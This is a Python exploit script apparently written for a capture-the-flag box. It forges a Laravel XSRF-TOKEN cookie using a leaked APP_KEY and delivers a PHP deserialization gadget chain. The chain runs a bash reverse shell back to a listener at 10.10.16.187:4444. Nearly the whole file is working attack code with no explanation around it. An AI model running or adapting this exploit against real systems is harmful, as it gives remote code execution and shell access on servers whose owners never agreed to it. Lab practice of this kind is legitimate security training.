#!/usr/bin/env python3
import requests
import base64
import json
import hmac
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

TARGET = "http://dev-staging-01.academy.htb"
APP_KEY = "dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
LHOST = "10.10.16.187"
LPORT = 4444

def encrypt(value, key):
    key = base64.b64decode(key)
    iv = os.urandom(16)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    value = pad(value.encode(), AES.block_size)
    encrypted = cipher.encrypt(value)

    mac = hmac.new(key, iv + encrypted, hashlib.sha256).hexdigest()

    payload = {
        "iv": base64.b64encode(iv).decode(),
        "value": base64.b64encode(encrypted).decode(),
        "mac": mac
    }

    return base64.b64encode(json.dumps(payload).encode()).decode()

def main():
    cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

    # More reliable gadget
    payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\x00*\x00events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"\x00*\x00listeners";a:1:{s:5:"test1";a:1:{i:0;s:%d:"%s";}}}s:8:"\x00*\x00event";s:5:"test1";}' % (len(cmd), cmd)

    print("[*] Encrypting payload...")
    token = encrypt(payload, APP_KEY)

    headers = {
        "X-XSRF-TOKEN": token
    }

    print("[*] Sending request...")
    try:
        r = requests.get(TARGET, headers=headers, timeout=10, verify=False)
        print(f"[+] Status: {r.status_code}")
        print("[*] Check your listener")
    except Exception as e:
        print(f"[-] {e}")

if __name__ == "__main__":
    main()
